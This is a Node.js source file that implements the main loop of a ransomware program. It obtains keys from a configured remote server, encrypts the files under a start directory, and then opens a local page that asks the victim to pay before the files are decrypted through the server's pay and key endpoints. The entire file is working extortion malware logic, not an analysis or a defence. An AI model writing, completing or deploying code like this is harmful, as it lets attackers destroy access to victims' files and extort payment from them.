import 'babel-polyfill'

import express from 'express'
import open from 'open'
import request from 'request-promise'
import {generatePasswordSecretPair, decryptPassword, encryptDirectory, decryptDirectory} from './crypt'
import {writeJson, readJson} from 'fs-promise'
import promisify from 'es6-promisify'
import config from '../config.json'

const isOnline = promisify(require('is-online'))

let app = express()

app.get('/', (req, res) => {
  res.send(`
      <html>
        <b>You must be connected to the internet to pay and decrypt your files</b>
        <br>
        <form action="/pay" method="post">
          <button>Pay</button>
        </form>
      </html>
  `)
})

app.post('/pay', (req, res) => {
  readJson(config.dataPath)
    .then(data => request(`${config.remoteServer}/pay/${data.id}`))
    .then(doDecryption)
    .then(() => {
      res.send(`
      <html>
        Thanks! Your files are decrypted.
      </html>
    `)
    }).catch(err => {
      res.send(err)
    })
})

function writeData(pair) {
  const {key, id} = pair
  const {password, secret} = generatePasswordSecretPair(key)
  const data = {
    id,
    secret
  }
  return writeJson(config.dataPath, data).then(() => password)
}

function obtainKeys() {
  return isOnline().then(online => {
    if (online) {
      return request(`${config.remoteServer}/pair`).then(JSON.parse)
    } else {
      return readJson(__dirname + '/../data/offline.json')
    }
  })
}

function encrypt(password) {
  return encryptDirectory(config.startPath, password)
}

function decrypt(key) {
  return readJson(config.dataPath)
    .then(data => decryptPassword(key, data.secret))
    .then(password => decryptDirectory(config.startPath, password))
}

function doEncryption() {
  return obtainKeys()
    .then(writeData)
    .then(encrypt)
}

function doDecryption() {
  return readJson(config.dataPath)
    .then(data => request(`${config.remoteServer}/key/${data.id}`))
    .then(JSON.parse)
    .then(decrypt)
}

doEncryption().then(() => {
  app.listen(config.port, () => open(`http://127.0.0.1:${config.port}`))
}).catch(err => {
  console.log(err)
})
